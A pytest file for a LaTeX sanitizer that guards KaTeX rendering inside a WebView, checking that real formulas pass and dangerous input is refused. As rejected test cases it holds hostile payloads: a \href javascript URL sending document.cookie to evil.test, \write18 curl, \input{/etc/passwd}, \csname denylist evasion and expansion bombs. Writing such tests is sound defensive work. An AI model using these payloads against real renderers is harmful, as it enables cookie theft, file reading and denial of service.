"""Dangerous LaTeX (spec section 30: 危険なLaTeX入力のサニタイズテスト).

The formula string reaches KaTeX inside a WebView, so these are the cases where "it is
only maths" stops being true.
"""

from __future__ import annotations

import pytest

from papermatch_api.text.latex_safety import (
    MAX_GROUP_DEPTH,
    MAX_LENGTH,
    check_latex,
    is_safe_latex,
)

# ------------------------------------------------------------------ real formulas pass


@pytest.mark.parametrize(
    "latex",
    [
        r"E = mc^2",
        r"S_{\mathrm{EE}} = \frac{c}{3}\log\frac{\ell}{\epsilon}",
        r"\int_{-\infty}^{\infty} e^{-x^2}\,dx = \sqrt{\pi}",
        r"\left( \frac{\partial u}{\partial t} \right)_{V} = -\nabla \cdot \mathbf{J}",
        r"\begin{pmatrix} a & b \\ c & d \end{pmatrix}",
        r"\sum_{n=1}^{\infty} \frac{1}{n^2} = \frac{\pi^2}{6}",
        r"\hat{H}\psi = i\hbar \frac{\partial \psi}{\partial t}",
        # Escaped braces are characters, not groups.
        r"\{ x \in \mathbb{R} : x > 0 \}",
        # A modest \hspace is ordinary typesetting.
        r"a \hspace{2em} b",
    ],
)
def test_ordinary_mathematics_is_admitted(latex: str) -> None:
    verdict = check_latex(latex)
    assert verdict.safe, f"refused with {verdict.issues}"


# --------------------------------------------------------------- escaping the formula


def test_a_javascript_url_cannot_be_smuggled_in_through_href() -> None:
    """The one that matters most: `\\href` renders an anchor inside the WebView."""
    verdict = check_latex(r"\href{javascript:fetch('//evil.test/'+document.cookie)}{x}")
    assert verdict.safe is False
    assert [i.code for i in verdict.issues] == ["forbidden_command"]
    assert "href" in verdict.issues[0].detail


@pytest.mark.parametrize(
    "latex",
    [
        r"\url{data:text/html,<script>alert(1)</script>}",
        r"\htmlStyle{position:fixed;top:0;width:100vw;height:100vh}{x}",
        r"\htmlId{login-form}{x}",
        r"\htmlClass{app-overlay}{x}",
        r"\htmlData{token=1}{x}",
        r"\includegraphics{//evil.test/pixel.png}",
        r"\special{html:<a href=evil>}",
    ],
)
def test_commands_that_reach_the_host_document_are_refused(latex: str) -> None:
    assert is_safe_latex(latex) is False


def test_the_refusal_says_which_command_and_why() -> None:
    """A reviewer looking at a rejected formula needs more than a boolean."""
    verdict = check_latex(r"\includegraphics{x.png}")
    assert verdict.issues[0].detail == r"\includegraphics: loads an external resource"


# ------------------------------------------------------------------- expansion bombs


def test_the_classic_expansion_bomb_is_refused() -> None:
    r"""Each \def doubles the previous one; ten of these is a hung renderer."""
    bomb = (
        r"\def\a{aaaaaaaaaa}\def\b{\a\a\a\a\a\a\a\a\a\a}"
        r"\def\c{\b\b\b\b\b\b\b\b\b\b}\def\d{\c\c\c\c\c\c\c\c\c\c}\d"
    )
    verdict = check_latex(bomb)
    assert verdict.safe is False
    assert all(i.code == "forbidden_command" for i in verdict.issues)


@pytest.mark.parametrize(
    "command",
    ["def", "gdef", "edef", "xdef", "let", "newcommand", "renewcommand", "providecommand"],
)
def test_every_macro_definition_form_is_refused(command: str) -> None:
    assert is_safe_latex(rf"\{command}\x{{y}} \x") is False


def test_building_a_command_name_at_expansion_time_is_refused() -> None:
    r"""`\csname` + `\expandafter` is how a denylist gets walked around."""
    assert is_safe_latex(r"\csname hre\endcsname f{javascript:1}{x}") is False
    assert is_safe_latex(r"\expandafter\href\csname x\endcsname") is False


# --------------------------------------------------------------- engine and file access


@pytest.mark.parametrize(
    "latex",
    [
        r"\input{/etc/passwd}",
        r"\include{secrets}",
        r"\write18{curl evil.test}",
        r"\openout1=/tmp/x",
        r"\read1 to \x",
        r"\catcode`\@=11",
    ],
)
def test_file_and_engine_primitives_are_refused(latex: str) -> None:
    assert is_safe_latex(latex) is False


# ------------------------------------------------------------------------ layout bombs


def test_an_enormous_rule_is_refused() -> None:
    """Renders a box tall enough to lock up the view."""
    verdict = check_latex(r"\rule{1pt}{99999em}")
    assert verdict.safe is False
    assert verdict.issues[0].code == "dimension_too_large"


def test_the_limit_is_on_the_size_not_the_command() -> None:
    """`\\rule` at a sane size is ordinary typesetting and stays allowed."""
    assert is_safe_latex(r"\rule{1pt}{0.5em}") is True


def test_a_huge_dimension_in_any_unit_is_caught() -> None:
    assert is_safe_latex(r"\hspace{5000cm}") is False
    assert is_safe_latex(r"\hspace{100000pt}") is False


# ------------------------------------------------------------------------ size limits


def test_an_overlong_formula_is_refused() -> None:
    verdict = check_latex("x + " * (MAX_LENGTH // 2))
    assert verdict.safe is False
    assert any(i.code == "too_long" for i in verdict.issues)


def test_deeply_nested_groups_are_refused() -> None:
    depth = MAX_GROUP_DEPTH + 5
    verdict = check_latex("{" * depth + "x" + "}" * depth)
    assert verdict.safe is False
    assert any(i.code == "nesting_too_deep" for i in verdict.issues)


def test_nesting_right_at_the_limit_is_still_admitted() -> None:
    depth = MAX_GROUP_DEPTH
    assert is_safe_latex("{" * depth + "x" + "}" * depth) is True


# --------------------------------------------------------------------- malformed input


def test_unbalanced_braces_are_refused_before_the_renderer_sees_them() -> None:
    """Not a security case — a correctness one. KaTeX would throw, and the point of
    catching it here is that the LaTeX-source fallback renders instead of an error box."""
    assert [i.code for i in check_latex(r"\frac{a}{b").issues] == ["unbalanced_braces"]
    assert [i.code for i in check_latex(r"a}b").issues] == ["unbalanced_braces"]


def test_unbalanced_left_and_right_are_refused() -> None:
    verdict = check_latex(r"\left( x")
    assert [i.code for i in verdict.issues] == ["unbalanced_delimiters"]


def test_an_empty_formula_is_not_a_formula() -> None:
    assert is_safe_latex("") is False
    assert is_safe_latex("   \n ") is False


def test_a_nul_byte_is_refused() -> None:
    assert is_safe_latex("x\x00y") is False


# ---------------------------------------------------------------------- reporting shape


def test_every_reason_is_reported_not_just_the_first() -> None:
    """A formula that trips three limits is a different thing from one that trips a
    single conservative limit, and whoever triages it needs to see all three."""
    verdict = check_latex(r"\href{javascript:1}{\rule{1pt}{99999em}} \left(")
    codes = {i.code for i in verdict.issues}
    assert codes == {"forbidden_command", "dimension_too_large", "unbalanced_delimiters"}


def test_the_same_banned_command_twice_is_one_finding() -> None:
    verdict = check_latex(r"\href{a}{b} \href{c}{d}")
    assert len(verdict.issues) == 1


def test_the_verdict_is_usable_as_a_boolean() -> None:
    assert bool(check_latex("E = mc^2")) is True
    assert bool(check_latex(r"\input{x}")) is False


def test_nothing_is_rewritten() -> None:
    """Spec section 11: 原式を勝手に変換しない.

    The module returns a verdict, never a modified formula. A stripped formula would look
    like the paper's equation without being it, which is worse than not rendering.
    """
    import papermatch_api.text.latex_safety as module

    exported = {name for name in module.__all__ if name[0].islower()}
    assert exported == {"check_latex", "is_safe_latex"}


def test_the_command_scan_errs_towards_refusing() -> None:
    r"""``a \\href`` is a line break followed by the word "href", not a command.

    The scanner reads the second backslash as starting ``\href`` and refuses. That is the
    direction to be wrong in: a false positive costs one formula rendered from its source
    instead of typeset, a false negative costs a script running in the WebView. The usual
    spelling — ``\\`` followed by a space — is unaffected, so the cost in practice is
    close to nothing.
    """
    assert is_safe_latex(r"a \\href b") is False
    assert is_safe_latex(r"\begin{array}{c} a \\ href \end{array}") is True
